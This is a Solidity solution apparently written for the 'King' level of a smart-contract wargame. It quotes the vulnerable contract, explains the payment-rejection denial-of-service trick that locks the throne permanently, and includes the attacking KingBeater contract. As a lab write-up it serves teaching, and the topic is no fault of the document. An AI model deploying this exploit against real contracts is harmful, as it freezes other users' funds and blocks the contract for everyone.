/*
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

    address public king;
    uint public prize;

    function King() public payable {
        king = msg.sender;
        prize = msg.value;
    }

    function() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }
}

The idea here is to lock the ownership forever. Only possible with contract:
0 - We create a contract who claims the ownership
1 - We claim ownership paying the prize
2 - The next caller, will pay the prize, but king.transfer(msg.value); will fail (because in our contract, we have designed it to fail when somebody pays it).

The contract can be designed either as:
a) a contract with a fallback function called on payments, which an explicit revert() call.
b) a contract without a fallback function (so nobody can pay it, unless the contract that pays, self-destructs).
*/

pragma solidity ^0.4.18;

contract KingBeater {
    
    function KingBeater() public {}
    
    function giveToKing(address theKing) public payable {
        theKing.call.value(msg.value)();
    }
}